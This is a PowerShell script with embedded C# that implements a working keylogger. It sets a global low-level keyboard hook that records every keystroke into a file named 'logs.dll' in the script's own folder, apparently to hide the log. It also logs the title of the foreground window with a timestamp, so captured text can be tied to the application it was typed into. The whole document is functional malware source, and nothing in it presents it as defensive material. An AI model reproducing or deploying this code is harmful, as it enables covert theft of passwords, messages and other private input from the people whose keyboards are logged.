
$csharp  = @"
  using System;
  using System.Runtime.InteropServices;
  using System.Text;
  using System.Diagnostics;
  using System.Windows.Forms;

  public class WinAPI {
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll")]
    public static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    public static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);


    // Hook procedure for low level keyboard events
    public const int WH_KEYBOARD_LL = 13;
    // Pressed key
    public const int WM_KEYDOWN = 0x0100;

    // Duh
    public static string currDir { get; set; }

    // Yeah
    //static IntPtr key_layout;

    // For dynamic ref to hook procedures (delegate - package method into
    // instance for async comm's - it also makes sure that the async method
    // instance would have the same signature type)
    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    public static LowLevelKeyboardProc proc = catchKeyEvents;


    // nCode - if event info is here or not, wParam - key press event,
    // lParam - key codes and flags
    // for async callback
    public static IntPtr catchKeyEvents(int nCode, IntPtr wParam, IntPtr lParam) {

      // If there is event info and key is pressed
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {

        // Read
        int virtual_code = Marshal.ReadInt32(lParam);

        // Checks the status of keys
        //byte[] keyStates = new byte[256];
        //if (!GetKeyboardState(keyState))
          //return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);

        // Console.WriteLine("[{0}]", currDir);
        string keyText = string.Format("[{0}]", (Keys)virtual_code);
        // string logFilePath = @"\\VBOXSVR\share\tools\keylog\logs.dll";

        System.IO.File.AppendAllText(currDir, keyText);
      }

      // Next hook procedures...
      return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);

    }

    public static IntPtr initHookProc() {

      // First arg - hook proc val, second - pointer to it, third - dll handle, fourth - thread id
      // Hook procedure watches for all threads
      return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);

    }

    public static void endHookProc(IntPtr keyboard_hook) {

      // Off the hook, get it?
      UnhookWindowsHookEx(keyboard_hook);

    }

  }
"@

# You know
Add-Type -ReferencedAssemblies System.Windows.Forms -TypeDefinition $csharp -Language CSharp

#$global:keyboard_hook = [WinAPI]::initHookProc();

# Pass to c#
$global:k_cur_dir = $PSScriptRoot
[WinAPI]::currDir = ($global:k_cur_dir + "\logs.dll")

# For saving prev fg
$global:fg_prev_title = ""

# For logic between prev and curr fg's
[bool] $global:next_iters = $false

while ($true) {
  # give time for...you know
  Start-Sleep -Milliseconds 40

  # Get the handle for foreground
  $global:fg_handle = [WinAPI]::GetForegroundWindow();


  # Ignore
  $global:dummyprocessid = 0


  # if it exists
  if (-Not ($global:fg_handle -eq [System.IntPtr]::Zero)) {

    # For window's text
    $global:fg_thread_id = [WinAPI]::GetWindowThreadProcessId($global:fg_handle, [ref]$global:dummyprocessid)
    $global:fg_str_build = New-Object System.Text.StringBuilder 256

    # For layout
    $global:key_layout = [WinAPI]::GetKeyboardLayout($global:fg_thread_id)

    # Finally, the title
    $global:fg_title_length = [WinAPI]::GetWindowText($global:fg_handle, $global:fg_str_build, $global:fg_str_build.Capacity)


    # If this is the first iter, then populate prev fg
    if (!$global:next_iters) {
      $global:fg_prev_title = $global:fg_str_build.ToString()
      $global:fg_curr_title = $global:fg_str_build.ToString()

      $global:date = Get-Date
      Add-Content -Path ./logs.dll -Value "[ $global:fg_curr_title at $global:date ]"
      $global:keyboard_hook = [WinAPI]::initHookProc();
      $global:next_iters = $true
    }
    else {
      $global:fg_curr_title = $global:fg_str_build.ToString()
    }

    # If there is a new fg
    if (-Not ($global:fg_curr_title -ceq $global:fg_prev_title)) {
      $global:fg_prev_title = $global:fg_curr_title
      [WinAPI]::endHookProc($global:keyboard_hook);

      $global:date = Get-Date
      Add-Content -Path "$global:k_cur_dir\logs.dll" -Value "[ $global:fg_curr_title at $global:date ]"
      $global:keyboard_hook = [WinAPI]::initHookProc();
    }

  }
}

#[WinAPI]::endHookProc($global:keyboard_hook);
